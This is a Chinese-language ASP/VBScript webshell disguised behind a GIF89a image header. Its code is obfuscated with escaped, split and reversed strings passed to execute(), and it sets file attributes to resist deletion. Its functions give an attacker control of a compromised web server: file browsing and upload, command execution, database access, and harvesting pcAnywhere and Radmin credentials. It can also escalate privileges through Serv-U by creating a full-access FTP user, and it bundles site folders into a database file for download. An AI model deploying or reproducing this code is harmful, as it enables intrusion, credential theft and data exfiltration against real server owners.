GIF89a
<object runat=server id=oScriptlhn scope=page classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
<object runat=server id=oScriptlhn scope=page classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<%@ LANGUAGE = VBScript    %><%
Server.ScriptTimeout=999999999
UserPass="ju1213"      	  '密码h4ck防删版
mNametitle="网站有漏洞"  	  '名字
Copyright="H4ck Door"  	  '版权
SItEuRl="HTTP://baidu.com/"  	  '网站地址
Font="280pt"  	    	  '图案大小
pic="&#78;"  	    	    	  '登陆图案代码编号
BodyColor="#000000"  	  '整体页面背景颜色
FontColor="#9c9393"  	  '普通文字颜色
LinkColor="#B4A9A9"  	  '链接颜色
BorderColor="#d8d8d8"  	  '文件边框颜色
LinkOverBJ="#000000"  	  '鼠标移到链接上面背景的颜色
LinkOverFont="red"  	    	  '鼠标移到链接上面文字的颜色
FormColorBj="#dddddd"  	  '输入框架背景颜色
FormColorBorder="#222000"  	  '输入框架边框颜色
'**********************************************
'增加了最新的防改防删功能，满足了各位朋友的需要! 此版为内部vip版，请勿发布!
'**********************************************
Response.Buffer =true
On Error Resume Next 
sub ShowErr()
  If Err Then
RRS"<br><a href='javascript:history.back()'><br> " & Err.Description & "</a><br>"
Err.Clear:Response.Flush
  End If
end sub
Sub RRS(str)
response.write(str)
End Sub
Function RePath(S)
  RePath=Replace(S,"\","\\")
End Function
Function RRePath(S)
  RRePath=Replace(S,"\\","\")
End Function
URL=Request.ServerVariables("URL")
O0O0=Request.ServerVariables("PATH_TRANSLATED")
ServerIP=Request.ServerVariables("LOCAL_ADDR")
Action=Request("Action")
RootPath=Server.MapPath(".")
WWWRoot=Server.MapPath("/")
FolderPath=Request("FolderPath")
FName=Request("FName")

BackUrl="<br><br><center><a href='javascript:history.back()'>返回</a></center>":Function lI1(objstr):objstr=Replace(objstr,"",""""):For i=1 To Len(objstr):If Mid(objstr, i, 1)<>"" Then:NewStr=Mid(objstr,i,1)&NewStr:Else:NewStr=vbCrlf&NewStr:End If:Next:lI1=NewStr:End Function:RRS"<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">":RRS"<title>"&mNametitle&" - "&ServerIP&" </title>":RRS"<style type=""text/css"">":RRS"body,td{font-size: 12px;SCROLLBAR-FACE-COLOR: #232323; SCROLLBAR-HIGHLIGHT-COLOR: #383839;}":RRS"body,tr,td{margin:0px;font-size:12px;background-color:"&BodyColor&";color:"&FontColor&";}":RRS"input,select,textarea{font-size:12px;background-color:"&FormColorBj&";border:1px solid "&FormColorBorder&"}":RRS"a{color:"&LinkColor&";text-decoration:none;}a:hover{color:"&LinkOverFont&";background:"&LinkOverBJ&"}":RRS".am{color:"&LinkColor&";font-size:11px;}":RRS"</style>"
Set   fso =  CreateObject("Scripting.FileSystemObject"):Set f=fso.GetFile(O0O0):if  f.attributes <> 39 then:f.attributes = 39:end if:dim a,b:a=" RRS%22%3Cscript%20language%3Djavascript%3Efunction%20killErrors%28%29%7Breturn%20true%3B%7Dwindow.onerror%3DkillErrors%3B%22%0D%0ARRS%22function%20yesok%28%29%7Bif%20%28confirm%28%22%22%u4F60%u786E%u8BA4%u8981%u6267%u884C%u6B64%u64CD%u4F5C%u5417%uFF1F%22%22%29%29return%20true%3Belse%20return%20false%3B%7D%22%0D%0ARRS%22function%20ShowFolder%28Folder%29%7Btop.addrform.FolderPath.value%20%3D%20Folder%3Btop.addrform.submit%28%29%3B%7D%22%0D%0ARRS%22function%20FullForm%28FName%2CFAction%29%7Btop.hideform.FName.value%20%3D%20FName%3Bif%28FAction%3D%3D%22%22CopyFile%22%22%29%7BDName%20%3D%20prompt%28%22%22%u8BF7%u4F60%u8F93%u5165%u590D_%u5236%u5230%u76EE%u6807%u6587_%u4EF6%u7684_%u5168_%u540D_%u79F0%22%22%2CFName%29%3Btop.hideform.FName.value%20+%3D%20%22%22%7C%7C%7C%7C%22%22+DName%3B%7Delse%20if%28FAction%3D%3D%22%22MoveFile%22%22%29%7BDName%20%3D%20prompt%28%22%22%u8BF7%u4F60%u8F93%u5165_%u79FB_%u52A8%u5230%u76EE%u6807%u6587%u4EF6_%u5168_%u540D_%u79F0%22%22%2CFName%29%3Btop.hideform.FName.value%20+%3D%20%22%22%7C%7C%7C%7C%22%22+DName%3B%7Delse%20if%28FAction%3D%3D%22%22CopyFolder%22%22%29%7BDName%20%3D%20prompt%28%22%22%u8BF7%u4F60%u8F93%u5165%u79FB%u52A8%u5230%u76EE%u6807%u6587%u4EF6%u5939_%u5168_%u540D_%u79F0%22%22%2CFName%29%3Btop.hideform.FName.value%20+%3D%20%22%22%7C%7C%7C%7C%22%22+DName%3B%7Delse%20if%28FAction%3D%3D%22%22MoveFolder%22%22%29%7BDName%20%3D%20prompt%28%22%22%u8BF7%u4F60%u8F93%u5165%u79FB%u52A8%u5230%u76EE%u6807%u6587%u4EF6%u5939_%u5168_%u540D_%u79F0%22%22%2CFName%29%3Btop.hideform.FName.value%20+%3D%20%22%22%7C%7C%7C%7C%22%22+DName%3B%7Delse%20if%28FAction%3D%3D%22%22NewFolder%22%22%29%7BDName%20%3D%20prompt%28%22%22%u8BF7%u4F60%u8F93%u5165%u8981%u65B0%u5EFA%u7684%u6587%u4EF6%u5939_%u5168_%u540D_%u79F0%22%22%2CFName%29%3Btop.hideform.FName.value%20%3D%20DName%3B%7Delse%20if%28FAction%3D%3D%22%22CreateMdb%22%22%29%7BDName%20%3D%20prompt%28%22%22%u8BF7%u4F60%u8F93%u5165%u8981%u65B0%u5EFA%u7684Mdb%u6587%u4EF6_%u5168_%u540D_%u79F0%2C%u6CE8%u610F%u4E0D%u80FD%u540C%u540D%uFF01%22%22%2CFName%29%3Btop.hideform.FName.value%20%3D%20DName%3B%7Delse%20if%28FAction%3D%3D%22%22CompactMdb%22%22%29%7BDName%20%3D%20prompt%28%22%22%u8BF7%u4F60%u8F93%u5165%u8981%u538B%u7F29%u7684Mdb%u6587%u4EF6_%u5168_%u540D_%u79F0%2C%u6CE8%u610F%u6587%u4EF6%u662F%u5426%u5B58%u5728%uFF01%22%22%2CFName%29%3Btop.hideform.FName.value%20%3D%20DName%3B%7Delse%7BDName%20%3D%20%22%22Other%22%22%3B%7Dif%28DName%21%3Dnull%29%7Btop.hideform.Action.value%20%3D%20FAction%3Btop.hideform.submit%28%29%3B%7Delse%7Btop.hideform.FName.value%20%3D%20%22%22%22%22%3B%7D%7D%22":b=replace(a,"@@@","Rinimama"):c=split(b,"Rinimama"):for i=0 to ubound(c):temp=temp+c(i):next:execute(unescape(temp)):RRS"function DbCheck(){if(DbForm.DbStr.value == """"){alert(""请你先连接数据库"");FullDbStr(0);return false;}return true;}":RRS"function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = ""Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&RePath(Session("FolderPath"))&"\\db.mdb;Jet OLEDB:Database Password=***"";Str[1] = ""Driver={Sql Server};Server="&ServerIP&",1433;Database=DbName;Uid=sa;Pwd=****"";Str[2] = ""Driver={MySql};Server="&ServerIP&";Port=3306;Database=DbName;Uid=root;Pwd=****"";Str[3] = ""Dsn=DsnName"";Str[4] = ""SELECT * FROM [TableName] WHERE ID<100"";Str[5] = ""INSERT INTO [TableName](USER,PASS) VALUES(\'username\',\'password\')"";Str[6] = ""DELETE FROM [TableName] WHERE ID=100"";Str[7] = ""UPDATE [TableName] SET USER=\'username\' WHERE ID=100"";Str[8] = ""CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))"";Str[9] = ""DROP TABLE [TableName]"";Str[10]= ""ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)"";Str[11]= ""ALTER TABLE [TableName] DROP COLUMN PASS"";Str[12]= ""当只显示一条数据时即可显示字段的全部字节，可用条件控制查询实现.\n超过一条数据只显示字段的前五十个字节。"";if(i<=3){DbForm.DbStr.value = Str[i];DbForm.SqlStr.value = """";abc.innerHTML=""<center>请确认己连接数据库再输入SQL操作命令语句。</center>"";}else if(i==12){alert(Str[i]);}else{DbForm.SqlStr.value = Str[i];}return true;}":RRS"function FullSqlStr(str,pg){if(DbForm.DbStr.value.length<5){alert(""请你检查数据库连接串是否正确!"");return false;}if(str.length<10){alert(""请你检查SQL语句是否正确!"");return false;}DbForm.SqlStr.value = str;DbForm.Page.value = pg;abc.innerHTML="""";DbForm.submit();return true;}":RRS"</script>":rrs "<body" :If Action="" then RRS " scroll=no":rrs ">"
Dim ObT(13,2):ObT(0,0) = "Scripting.FileSystemObject":ObT(0,2) = "文 件 操 作 组 件":ObT(1,0) = "wscript.shell":ObT(1,2) = "命令行执行组件,显示'<font color=red>×</font>'时用<a href='?Action=cmdx' target='FileFrame'> <font color=red> 执行Cmd二</font></a> 此功能执行":ObT(2,0) = "ADOX.Catalog":ObT(2,2) = "ACCESS 建 库 组 件":ObT(3,0) = "JRO.JetEngine":ObT(3,2) = "ACCESS 压 缩 组 件":ObT(4,0) = "Scripting.Dictionary":ObT(4,2) = "数据流 上 传 辅助 组件":ObT(5,0) = "Adodb.connection":ObT(5,2) = "数据库 连接 组件":ObT(6,0) = "Adodb.Stream":ObT(6,2) = "数据流 上传 组件":ObT(7,0) = "SoftArtisans.FileUp":ObT(7,2) = "SA-FileUp 文件 上传 组件":ObT(8,0) = "LyfUpload.UploadFile":ObT(8,2) = "刘云峰 文件 上传 组件":ObT(9,0) = "Persits.Upload.1":ObT(9,2) = "ASPUpload 文件 上传 组件":ObT(10,0) = "JMail.SmtpMail":ObT(10,2) = "JMail 邮件 收发 组件":ObT(11,0) = "CDONTS.NewMail":ObT(11,2) = "虚拟SMTP 发信 组件":ObT(12,0) = "SmtpMail.SmtpMail.1":ObT(12,2) = "SmtpMail 发信 组件":ObT(13,0) = "Microsoft.XMLHTTP":ObT(13,2) = "数据 传输 组件":For i=0 To 13:Set T=Server.CreateObject(ObT(i,0)):If -2147221005 <> Err Then:IsObj=" √":Else:IsObj=" ×":Err.Clear:End If:Set T=Nothing:ObT(i,1)=IsObj:Next:If FolderPath<>"" then:Session("FolderPath")=RRePath(FolderPath):End If:If Session("FolderPath")="" Then:FolderPath=RootPath:Session("FolderPath")=FolderPath:End if:



Function PcAnywhere4()
RRS"<div align='center'>PcAnywhere提权 Bin版本</div>"
RRS"<form name='xform' method='post'>"
RRS"<table width='80%'border='0'><tr>"
RRS"<td width='10%'>cif文件: </td><td width='10%'><input name='path' type='text' value='C:\Documents and Settings\All Users\Application Data\\Symantec\pcAnywhere\Citempl.cif' size='80'></td>"
RRS"<td><input type='submit' value=' 提交 '></td>"
RRS"</table>"
end Function
RRS"</form>"
RRS"<script>"
RRS"function RUNonclick(){"
RRS"document.xform.china.name = parent.pwd.value;"
RRS"document.xform.action = parent.url.value;"
RRS"document.xform.submit();"
RRS"}"
RRS"</script>"
Function StreamLoadFromFile(sPath)
Dim oStream
Set oStream = Server.CreateObject("Adodb.Stream")
With oStream
.Type = 1
.Mode = 3
.Open
.LoadFromFile(sPath)
.Position = 0
StreamLoadFromFile = .Read
.Close
End With
Set oStream = Nothing
End Function
Function hexdec(strin) 
Dim i, j, k, result 
result = 0 
For i = 1 To Len(strin) 
If Mid(strin, i, 1) = "f" Or Mid(strin, i, 1) ="F" Then 
 j = 15 
End If 
If Mid(strin, i, 1) = "e" Or Mid(strin, i, 1) = "E" Then 
 j = 14 
End If 
If Mid(strin, i, 1) = "d" Or Mid(strin, i, 1) = "D" Then 
 j = 13 
End If 
If Mid(strin, i, 1) = "c" Or Mid(strin, i, 1) = "C" Then 
 j = 12 
End If 
If Mid(strin, i, 1) = "b" Or Mid(strin, i, 1) = "B" Then 
 j = 11 
End If 
If Mid(strin, i, 1) = "a" Or Mid(strin, i, 1) = "A" Then 
 j = 10 
End If 
If Mid(strin, i, 1) <= "9" And Mid(strin, i, 1) >= "0" Then 
 j = CInt(Mid(strin, i, 1)) 
End If 
For k = 1 To Len(strin) - i 
 j = j * 16 
Next 
result = result + j 
Next 
hexdec = result 
End Function 
Function PcAnywhere(data,mode)
HASH= Mid(data,3)
If mode = "pass" Then number = 32: Cifnum = 144
If mode = "user" Then number = 30: Cifnum = 15
For i = 1 To number Step 2 
pcstr=((hexdec(Mid(data,i,2)) xor hexdec(Mid(hash,i,2))) xor Cifnum)
If ((pcstr <= 32) Or (pcstr>127)) Then Exit For 
decode = decode + Chr(pcstr)
Cifnum=Cifnum+1
Next 
PcAnywhere=decode
End function
Function bin2hex(binstr)
For i = 1 To LenB(binstr)
hexstr = Hex(AscB(MidB(binstr, i, 1)))
If Len(hexstr)=1 Then 
bin2hex=bin2hex&"0"&(LCase(hexstr))
Else
bin2hex=bin2hex& LCase(hexstr)
End If 
Next
End Function 
CIF = Request("path")
If CIF <> "" Then 
BinStr=StreamLoadFromFile(CIF) 
Response.write "Pcanywhere Reader ==><br><br>"
Response.write "PATH:"&CIF&"<br>"
Response.write "帐号:"&PcAnywhere (Mid(bin2hex(BinStr),919,64),"user")
Response.write "<br>"
Response.write "密码:"&PcAnywhere (Mid(bin2hex(BinStr),1177,32),"pass")
End If 
Function radmin()
Set WSH= Server.CreateObject("WSCRIPT.SHELL")
RadminPath="HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\"
Parameter="Parameter"
Port = "Port"
Response.write"<br>注意:读出HASH值后用RadminHash工具或od调试连接，工具下载地址:http://aspmuma.cn/soft/Radmin_hash.rar<br><br>"
ParameterArray=WSH.REGREAD(RadminPath & Parameter )
Response.write Parameter&":"
If IsArray(ParameterArray) Then
For i = 0 To UBound(ParameterArray)
If  Len (hex(ParameterArray(i)))=1 Then 
strObj = strObj & "0"&CStr(Hex(ParameterArray(i)))
Else
strObj = strObj & Hex(ParameterArray(i))
End If 
Next
response.write strobj
Else
response.write "Error! Can't Read!"
End If
Response.write "<br><br>"
PortArray=WSH.REGREAD(RadminPath & Port )
If IsArray(PortArray) Then 
Response.write Port &":" 
Response.write hextointer(CStr(Hex(PortArray(1)))&CStr(Hex(PortArray(0))))
Else 
Response.write "Error! Can't Read!"
End If
End Function
Function hextointer(strin) 
Dim i, j, k, result 
result = 0 
For i = 1 To Len(strin) 
If Mid(strin, i, 1) = "f" Or Mid(strin, i, 1) ="F" Then 
j = 15 
End If 
If Mid(strin, i, 1) = "e" Or Mid(strin, i, 1) = "E" Then 
j = 14 
End If 
If Mid(strin, i, 1) = "d" Or Mid(strin, i, 1) = "D" Then 
j = 13 
End If 
If Mid(strin, i, 1) = "c" Or Mid(strin, i, 1) = "C" Then 
j = 12 
End If 
If Mid(strin, i, 1) = "b" Or Mid(strin, i, 1) = "B" Then 
j = 11 
End If 
If Mid(strin, i, 1) = "a" Or Mid(strin, i, 1) = "A" Then 
j = 10 
End If 
If Mid(strin, i, 1) <= "9" And Mid(strin, i, 1) >= "0" Then 
j = CInt(Mid(strin, i, 1)) 
End If 
For k = 1 To Len(strin) - i 
j = j * 16 
Next 
result = result + j 
Next 
hextointer = result 
End Function:Gang="鳐鳐鳐鳐noitcnuF dnEgnihtoN=ptth teSdnes.pttheslaf,lrutsoP,""TSOP"" nepo.ptth))"""",""^"",w(ecalper(tcejbOetaerC =ptth testxen emuser rorre no)"""",flrcbv,)lrutsoP(mirt(ecalper=lrutsoP""1.5.tseuqerptthn^iw^.ptthni^w^""=ww mid)lrutsoP(dneSlmX noitcnuF鳐鳐鳐鳐鳐"
execute(Unlin(Gang))
:Function nmashdu(Code):nmashdu=Replace(Replace(StrReverse(Code),"\*\",""""),"/*/",vbCrlf):End Function:Function MainForm():RRS"<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame"">":RRS"<input type=""hidden"" name=""Action"">":RRS"<input type=""hidden"" name=""FName"">":RRS"</form>":RRS"<table width='100%'>":RRS"<form name='addrform' method='post' action='"&URL&"' target='_parent'>":RRS"<tr><td width='60' align='center'>地址：</td><td>":RRS"<input name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'>":RRS"</td><td width='140' align='center'><input name='Submit' type='submit' value='GO'> <input type='submit' value='刷新' onclick='FileFrame.location.reload()'>" :RRS"</td></tr></form></table>":RRS"<table width='100%' height='95.5%' style='border:1px solid #000000;' cellpadding='0' cellspacing='0'>":RRS"<td width='135' id=tl>":RRS"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='0'></iframe></td>":RRS"<td width=1 style='background:#000000'></td><td width=1 style='padding:2px'><a onclick=""document.getElementById('tl').style.display='none'"" href=##><b>[藏</b></a><p><a onclick=""document.getElementById('tl').style.display=''"" href=##><b>@示</b></a></p></td><td width=1 style='background:#424242'><td>":RRS"<iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='1'></iframe>":RRS"<tr><a href='javascript:ShowFolder(""C:\\Program Files"")'>(1)【Program】<a><a href='javascript:ShowFolder(""d:\\Program Files"")'>(2)【ProgramD】<a><a href='javascript:ShowFolder(""e:\\Program Files"")'>(3)【ProgramE】<a><a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Documents"")'>(4)【Documents】<a><a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\"")'>(5)【All_Users】<a><a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\「开始」菜单\\"")'>(6)【_始_菜巍<a><a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\"")'>(7)【程_序】<a><a href='javascript:ShowFolder(""C:\\recycler"")'>(8)【RECYCLER(C:\)】<a><a href='javascript:ShowFolder(""D:\\recycler"")'>(9)【RECYCLER(d:\)】<a><a href='javascript:ShowFolder(""e:\\recycler"")'>(10)【RECYCLER(e:\)】<a><br><a href='javascript:ShowFolder(""C:\\wmpub"")'>(1)【wmpub】<a><a href='javascript:ShowFolder(""C:\\WINDOWS\\Temp"")'>&nbsp;&nbsp;(2)【TEMP】<a>&nbsp;&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Program Files\\RhinoSoft.com"")'>(3)【ServU(1)】<a><a href='javascript:ShowFolder(""C:\\Program Files\\ServU"")'>(4)【ServU(2)】<a>&nbsp;<a href='javascript:ShowFolder(""C:\\WINDOWS"")'>(5)【WINDOWS】<a>&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\php"")'>(6)【PHP】<a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Program Files\\Microsoft SQL Server\\"")'>(7)【Mssql】<a><a href='javascript:ShowFolder(""c:\\prel"")'>(8)【prel文件夹】<a>&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""c:\\docume~1\\alluse~1\\Application Data\\Symantec\\pcAnywhere"")'>(9)【pcAnywhere】<a>&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\桌面"")'>(10)【Alluser桌面】<a>":RRS"</td></tr></form></table></td></tr><tr><td width='170'>":RRS"<iframe name='Left' src='?Action=MainMenu' width='100%' height='95%' frameborder='0'></iframe></td>":RRS"<td>":RRS"<iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='1'></iframe>":RRS"</td></tr></table>":End Function:

Sub PageAddToMdb()
Dim theAct, thePath
theAct = Request("theAct")
thePath = Request("thePath")
Server.ScriptTimeOut=100000
If theAct = "addToMdb" Then
addToMdb(thePath)
RRS "<div align=center><br>操作完成!</div>"&BackUrl
Response.End
End If
If theAct = "releaseFromMdb" Then
unPack(thePath)
RRS "<div align=center><br>操作完成!</div>"&BackUrl
Response.End
End If
RRS"<br>文件夹打包:"
RRS"<form method=post>"
RRS"<input type=hidden name=""#"" value=Execute(Session(""#""))>"
RRS"<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
RRS"<input type=hidden value=addToMdb name=theAct>"
RRS"<select name=theMethod><option value=fso>FSO</option><option value=app>无FSO</option>"
RRS"</select>"
RRS" <input type=submit value='开始打包'>"
RRS"<br><br>注: 打包生成HSH.mdb文件,位于sam木马同级目录下(rar格式方便下载!)"
RRS"</form>"
RRS"<hr/>文件包解开(需FSO支持):<br/>"
RRS"<form method=post>"
RRS"<input type=hidden name=""#"" value=Execute(Session(""#""))>"
RRS"<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & "\HSH.mdb"" size=80>"
RRS" <input type=hidden value=releaseFromMdb name=theAct><input type=submit value='解开包'>"
RRS"<br><br>注: 解开来的所有文件都位于sam木马同级目录下"
RRS"</form>"
End Sub
Sub addToMdb(thePath)
On Error Resume Next
Dim rs, conn, stream, connStr, adoCatalog
Set rs = Server.CreateObject("ADODB.RecordSet")
Set stream = Server.CreateObject("ADODB.Stream")
Set conn = Server.CreateObject("ADODB.Connection")
Set adoCatalog = Server.CreateObject("ADOX.Catalog")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & Server.MapPath("HSH.mdb")
adoCatalog.Create connStr
conn.Open connStr
conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
stream.Open
stream.Type = 1
rs.Open "FileData", conn, 3, 3
If Request("theMethod") = "fso" Then
fsoTreeForMdb thePath, rs, stream
 Else
saTreeForMdb thePath, rs, stream
End If
rs.Close
Conn.Close
stream.Close
Set rs = Nothing
Set conn = Nothing
Set stream = Nothing
Set adoCatalog = Nothing
End Sub
Function fsoTreeForMdb(thePath, rs, stream)
Dim item, theFolder, folders, files, sysFileList
sysFileList = "$HSH.mdb$HSH.ldb$"
If Server.CreateObject("Scripting.FileSystemObject").FolderExists(thePath) = False Then
showErr(thePath & " 目录不存在或者不允许访问!")
End If
Set theFolder = Server.CreateObject("Scripting.FileSystemObject").GetFolder(thePath)
Set files = theFolder.Files
Set folders = theFolder.SubFolders
For Each item In folders
fsoTreeForMdb item.Path, rs, stream
Next
For Each item In files
If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
rs.AddNew
rs("thePath") = Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent") = stream.Read()
rs.Update
End If
Next
Set files = Nothing
Set folders = Nothing
Set theFolder = Nothing
End Function
Sub unPack(thePath)
On Error Resume Next
Server.ScriptTimeOut=100000
Dim rs, ws, str, conn, stream, connStr, theFolder
str = Server.MapPath(".") & "\"
Set rs = CreateObject("ADODB.RecordSet")
Set stream = CreateObject("ADODB.Stream")
Set conn = CreateObject("ADODB.Connection")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & thePath & ";"
conn.Open connStr
rs.Open "FileData", conn, 1, 1
stream.Open
stream.Type = 1
Do Until rs.Eof
theFolder = Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
If Server.CreateObject("Scripting.FileSystemObject").FolderExists(str & theFolder) = False Then
createFolder(str & theFolder)
End If
stream.SetEos()
stream.Write rs("fileContent")
stream.SaveToFile str & rs("thePath"), 2
rs.MoveNext
Loop
rs.Close
conn.Close
stream.Close
Set ws = Nothing
Set rs = Nothing
Set stream = Nothing
Set conn = Nothing
End Sub
Sub createFolder(thePath)
Dim i
i = Instr(thePath, "\")
Do While i > 0
If Server.CreateObject("Scripting.FileSystemObject").FolderExists(Left(thePath, i)) = False Then
Server.CreateObject("Scripting.FileSystemObject").CreateFolder(Left(thePath, i - 1))
End If
If InStr(Mid(thePath, i + 1), "\") Then
i = i + Instr(Mid(thePath, i + 1), "\")
 Else
i = 0
End If
Loop
End Sub
Sub saTreeForMdb(thePath, rs, stream)
Dim item, theFolder, sysFileList
sysFileList = "$HSH.mdb$HSH.ldb$"
Set theFolder = saX.NameSpace(thePath)
For Each item In theFolder.Items
If item.IsFolder = True Then
saTreeForMdb item.Path, rs, stream
 Else
If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
rs.AddNew
rs("thePath") = Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent") = stream.Read()
rs.Update
End If
End If
Next
Set theFolder = Nothing
End Sub:Function suftp()
RRS"<p><center>Serv-U T权程序--增强版</p>":RRS"<form name='form1' method='post' action=''>":RRS"<center>管理员:<input name='duser' type='text' class='TextBox' id='duser' value='LocalAdministrator'><br>":RRS"<center>管理员密码 :<input name='dpwd' type='text' class='TextBox' id='dpwd' value='#l@$ak#.lk;0@P'><br>":RRS"<center>SERV-U端口:<input name='dport' type='text' class='TextBox' id='dport' value='43958'><br>":RRS"<center>添加的用户名:<input name='tuser' type='text' class='TextBox' id='tuser' value='1'><br>":RRS"<center>添加的用户密码:<input name='tpass' type='text' class='TextBox' id='pass' value='1'><br>":RRS"<center>帐号的所对的路径:<input name='tpath' type='text' class='TextBox' id='tpath' value='C:\'><br>":RRS"<center>服务端口:<input name='tport' type='text' class='TextBox' id='tport' value='21'><br>":RRS"<center><input name='radiobutton' type='radio' value='add' checked class='TextBox'>确定添加":RRS"<center><input type='radio' name='radiobutton' value='del' class='TextBox'>确定删除":RRS"<p><input name='Submit' type='submit' class='buttom' value='提交'></p></form>"
Usr = request.Form("duser")
pwd = request.Form("dpwd")
port = request.Form("dport")
tuser = request.Form("tuser")
tpass = request.Form("tpass")
tpath = request.Form("tpath")
tport = request.Form("tport")
'Command = request.Form("dcmd")
if request.Form("radiobutton") = "add" Then
leaves = "User " & Usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
'leaves = leaves & "-SETDOMAIN" & vbcrlf & "-Domain=cctv|0.0.0.0|43859|-1|1|0" & vbcrlf & "-TZOEnable=0" & vbcrlf & " TZOKey=" & vbcrlf
leaves = leaves & "-SETUSERSETUP" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & "-User=" & tuser & vbcrlf & "-Password=" & tpass & vbcrlf & _
"-HomeDir=" & tpath & "\" & vbcrlf & "-LoginMesFile=" & vbcrlf & "-Disable=0" & vbcrlf & "-RelPaths=1" & vbcrlf & _
"-NeedSecure=0" & vbcrlf & "-HideHidden=0" & vbcrlf & "-AlwaysAllowLogin=0" & vbcrlf & "-ChangePassword=0" & vbcrlf & _
"-QuotaEnable=0" & vbcrlf & "-MaxUsersLoginPerIP=-1" & vbcrlf & "-SpeedLimitUp=0" & vbcrlf & "-SpeedLimitDown=0" & vbcrlf & _
"-MaxNrUsers=-1" & vbcrlf & "-IdleTimeOut=600" & vbcrlf & "-SessionTimeOut=-1" & vbcrlf & "-Expire=0" & vbcrlf & "-RatioUp=1" & vbcrlf & _
"-RatioDown=1" & vbcrlf & "-RatiosCredit=0" & vbcrlf & "-QuotaCurrent=0" & vbcrlf & "-QuotaMaximum=0" & vbcrlf & _
"-Maintenance=System" & vbcrlf & "-PasswordType=Regular" & vbcrlf & "-Ratios=None" & vbcrlf & " Access=" & tpath & "\|RWAMELCDP" & vbcrlf
'leaves = leaves & "quit" & vbcrlf
On Error Resume Next
Set xPost = CreateObject("MSXML2.XMLHTTP")
xPost.Open "POST", "http://127.0.0.1:"& port &"/leaves", True
xPost.Send(leaves)
Set xPOST=nothing
response.write ("命令成功执行！！FTP 用户名: " & tuser & " " & "密码: " & tpass & " 路径: " & tpath & " :)<br><BR>")
else
leaves = "User " & Usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-DELETEUSER" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & " User=" & tuser & vbcrlf
Set xPost3 = CreateObject("MSXML2.XMLHTTP")
xPost3.Open "POST", "http://127.0.0.1:"& port &"/leaves", True
xPost3.Send(leaves)
Set xPOST3=nothing
end if
End Function:Function MainMenu():RRS"<table width='100%' cellspacing='0' cellpadding='0'>":RRS"<tr><td height='5'></td></tr>":RRS"<tr><td><center><font color=pink><font size=1.0>"&mName&"</font></font></center><hr color=#424242 size=1 >":RRS"</td></tr>":If ObT(0,1)=" ×" Then
RRS"<tr><td height='24'>无权限</td></tr>"
Else
RRS"<tr><td height=24 onmouseover=""menu1.style.display=''""><b>+>查看硬盘↓↓↓↓</b><div id=menu1 style=""width:100%;display='none'"" onmouseout=""menu1.style.display='none'"">"
Set ABC=New LBF:RRS ABC.ShowDriver():Set ABC=Nothing:RRS"":RRS"<tr><td height='20'><a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>&nbsp&nbsp●程序目录</a></td></tr>":RRS"</div></td></tr><tr><td height='20'><a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'>&nbsp&nbsp●站点目录</a></td></tr>":RRS"<tr><td height='20'><a href='?Action=goback' target='FileFrame'>&nbsp&nbsp●上目录</a></td></tr>":RRS"<tr><td height='20'><a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\Newfile")&""",""NewFolder"")'>&nbsp&nbsp●新建目录</a></td></tr>":RRS"<tr><td height='20'><a href='?Action=EditFile' target='FileFrame'>&nbsp&nbsp●新建文本</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=upfile' target='FileFrame'>&nbsp&nbsp●上传文件</a></td></tr>":End If
